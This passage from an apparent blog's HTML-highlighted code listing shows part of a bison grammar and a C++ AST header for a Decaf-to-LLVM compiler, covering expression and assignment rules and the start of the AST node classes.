&#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assigns: assign T_COMMA assigns &#123;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    | assign &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line">        decafVar* var = (decafVar *)$<span class="number">1</span>;</span><br><span class="line">        decafBinexp* <span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>;</span><br><span class="line">        decafAssign* ass = <span class="keyword">new</span> decafAssign(var-&gt;get_name(),<span class="built_in">exp</span>);</span><br><span class="line">        ass-&gt;kind = dass;</span><br><span class="line">        ass-&gt;put_arr(var-&gt;get_arr());</span><br><span class="line">        $$ = ass;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_NOT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;Not&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> %prec T_UMINUS &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;UnaryMinus&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    | T_ID &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafArrexp * arr = <span class="keyword">new</span> decafArrexp(*$<span class="number">1</span>,<span class="built_in">exp</span>); </span><br><span class="line">        $$ = arr; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;StringConstant&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_TRUE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;True&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_FALSE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;False&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// initialize LLVM</span></span><br><span class="line">    <span class="comment">// Make the module, which holds all the code.</span></span><br><span class="line">    TheModule = <span class="keyword">new</span> llvm::Module(<span class="string">&quot;Test&quot;</span>, Context);</span><br><span class="line">    <span class="comment">// set up symbol table</span></span><br><span class="line">    <span class="comment">// set up dummy main function</span></span><br><span class="line">    llvm::StringRef newFilename = <span class="string">&quot;DecafExpr&quot;</span>;</span><br><span class="line">    TheModule-&gt;setSourceFileName(newFilename);</span><br><span class="line">    <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">    <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">    <span class="comment">// remove symbol table</span></span><br><span class="line">    <span class="comment">// Finish off the main function. (see the WARNING above)</span></span><br><span class="line">    <span class="comment">// return 0 from main, which is EXIT_SUCCESS</span></span><br><span class="line">    <span class="comment">// Validate the generated code, checking for consistency.</span></span><br><span class="line">    <span class="comment">// Print out all of the generated code to stderr</span></span><br><span class="line">    TheModule-&gt;print(llvm::errs(), <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YYTOKENTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafexpr.tab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">extern</span> llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">descriptor</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		llvm::AllocaInst * alloc;</span><br><span class="line">		llvm::Function* func;</span><br><span class="line">		llvm::Value* value;</span><br><span class="line">		llvm::Type* type;</span><br><span class="line">	&#125;;</span><br><span class="line">	llvmValue kind;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafAST - Base class for all abstract syntax tree nodes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	descriptor des = &#123;<span class="number">0</span>,nullK&#125;;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> des.value;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Type *<span 